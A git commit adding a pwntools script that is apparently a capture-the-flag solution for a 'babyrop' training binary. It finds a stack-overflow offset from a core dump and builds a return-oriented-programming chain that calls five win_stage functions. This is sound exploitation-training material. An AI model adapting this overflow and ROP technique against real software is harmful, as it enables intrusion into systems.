000b12696adcad8759e615b789cb9ee6d1a2f94f
Federico Rega <federicorega1102@gmail.com>
2025-06-10 16:22:33 +0200

    Create rop3_1.py

---
+++ ROP/rop3_1.py
@@ -0,0 +1,39 @@
+#!/usr/bin/python3
+from pwn import *
+
+context.arch = 'amd64'
+
+elf = ELF('/challenge/babyrop_level3.1')
+
+io = elf.process(setuid=False) #disattivo il setuid per consentire al generazione del core dump
+io.sendline(cyclic(512,n=8))
+io.wait()
+buffer_len = cyclic_find(io.corefile.fault_addr,n=8)
+print(buffer_len)
+io.close()
+
+rop = ROP(elf)
+#pop_rdi_ret = 0x00401833
+#print(pop_rdi_ret)
+print(rop.rdi.address)
+
+rop.win_stage_1(1)
+rop.win_stage_2(2)
+rop.win_stage_3(3)
+rop.win_stage_4(4)
+rop.win_stage_5(5)
+
+print(rop.dump())
+
+PAYLOAD = b'A' * buffer_len +\
+    p64(rop.rdi.address) + p64(1) + p64(elf.symbols.win_stage_1)+\
+    p64(rop.rdi.address) + p64(2) + p64(elf.symbols.win_stage_2)+\
+    p64(rop.rdi.address) + p64(3) + p64(elf.symbols.win_stage_3)+\
+    p64(rop.rdi.address) + p64(4) + p64(elf.symbols.win_stage_4)+\
+    p64(rop.rdi.address) + p64(5) + p64(elf.symbols.win_stage_5)
+
+PAYLOAD = b'A'*buffer_len + rop.chain()
+
+io = elf.process()
+io.sendline(PAYLOAD)
+io.interactive()
